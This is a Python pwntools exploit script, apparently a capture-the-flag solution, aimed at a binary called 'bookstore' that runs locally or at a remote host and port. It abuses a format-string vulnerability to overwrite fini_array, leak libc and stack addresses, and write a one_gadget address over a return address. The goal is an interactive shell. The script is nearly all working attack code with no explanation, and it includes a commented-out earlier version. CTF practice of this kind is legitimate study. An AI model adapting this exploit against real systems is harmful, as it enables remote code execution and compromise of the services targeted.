#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64", log_level="info")
localfile = "./bookstore"
locallibc = "../glibc_versions/2.26/x64_notcache/lib/libc-2.26.so"

def menu(s):
    io.recvuntil("5: Submit\n")
    io.sendline(s)

def exp():
    fini_array = 0x6011B8
    puts_got   = elf.got["puts"]
    free_got   = elf.got["free"]

    # phase 1
    menu(b'4')

    # format string: overwrite fini_arrary with start, leak libc and stack
    payload = b"%1920x%13$hn...%14$s,,,%28$llx".ljust(0x90-28, b"A").ljust(0x88, b"\x00") + p64(0x151)
    menu(b"1")
    io.sendline(payload)
    # gdb.attach(io, "b *0x400B09")
    menu(b"5" + p8(0x1)*7 + p64(fini_array) + p64(puts_got))

    # leak libc and stack
    io.recvuntil(b"...")
    io.recvuntil(b"...")
    io.recvuntil(b"...")
    puts_addr = u64(io.recv(6).ljust(8, b"\x00"))
    io.recvuntil(b",,,")
    stack_addr = int(io.recv(12), 16)

    ret_addr = stack_addr - 0x288
    libc_base = puts_addr - libc.sym["puts"]

#########################################################
#   fail when part1 + part2 is too big (possible reason...
#########################################################
    # one_gadget = libc_base + 0x40d82
    # part1 =  one_gadget      % (1<<16)
    # part2 = (one_gadget>>16) % (1<<16)
    # log.debug("0x%x" % part1)
    # log.debug("0x%x" % part2)
    # if part2 > part1:
    #     part2 = part2 - part1
    # else:
    #     part2 = part2 + ((1<<16)-part1)

    # log.debug("0x%x" % part1)
    # log.debug("0x%x" % part2)

    # log.debug("ret addr: 0x%x" % ret_addr)
    # log.debug("one gadget: 0x%x" % one_gadget)
    
    # # phase 2
    # menu(b'4')
    # payload = b"%" + str(part1).encode("ascii") + b"x%13$hn" + b"%" + str(part2).encode("ascii") + b"x%14$hn"
    # payload = payload.ljust(0x90-28, b"A").ljust(0x88, b"\x00") + p64(0x151)
    # menu(b"1")
    # io.sendline(payload)
    # # gdb.attach(io, "b *0x400B09")
    # menu(b"5" + p8(0x1)*7 + p64(ret_addr) + p64(ret_addr+2))

    one_gadget = libc_base + 0x40d82
    log.debug("one gadget: 0x%x" % one_gadget)
    p1 = one_gadget       & 0xff
    p2 = (one_gadget>>8)  & 0xff
    p3 = (one_gadget>>16) & 0xff
    p4 = (one_gadget>>24) & 0xff

    part1 = p1
    part2 = p2-p1 if p2 > p1 else 256-p1+p2
    part3 = p3-p2 if p3 > p2 else 256-p2+p3
    part4 = p4-p3 if p4 > p3 else 256-p3+p4

    menu(b"4")
    payload  = b"%" + str(part1).encode("ascii") + b"x%13$hhn%" + str(part2).encode("ascii") + b"x%14$hhn"
    payload += b"%" + str(part3).encode("ascii") + b"x%15$hhn%" + str(part4).encode("ascii") + b"x%16$hhn"
    payload = payload.ljust(0x90-28, b"A").ljust(0x88, b"\x00") + p64(0x151)
    menu(b"1")
    io.sendline(payload)
    # gdb.attach(io, "b *0x400B09")
    menu(b"5" + p8(0x1)*7 + p64(ret_addr) + p64(ret_addr+1) + p64(ret_addr+2) + p64(ret_addr+3))

    io.interactive()




argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)

elf = ELF(localfile)
libc = ELF(locallibc)
exp()
